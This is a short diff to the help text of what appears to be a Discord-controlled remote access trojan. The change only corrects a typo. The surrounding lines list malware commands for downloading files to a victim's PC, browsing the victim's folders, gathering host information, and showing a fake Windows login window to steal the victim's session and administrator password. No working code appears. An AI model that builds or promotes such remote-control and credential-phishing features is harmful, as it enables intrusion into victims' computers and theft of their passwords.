@@ -22,7 +22,7 @@ All commands:
 (Maximum weight 8mb on v1 servers, if your server is v2 you can 50mb or v3 with 100mb)
 `{prefix}dfile <URL ARCHIVE> <PATH WHERE IT WILL BE SAVED>` : Download a file to the user PC
 `{prefix}cd <Route>` : Navigate through the user PC folders
-`{prefix}windowspass` : Generates a realistic window for the user t enter their session credentials (This to obtain the password and ADMINISTRATOR user)
+`{prefix}windowspass` : Generates a realistic window for the user to enter their session credentials (This to obtain the password and ADMINISTRATOR user)
 `{prefix}whoami` : Get information about the PC the file is running on.
 """
 
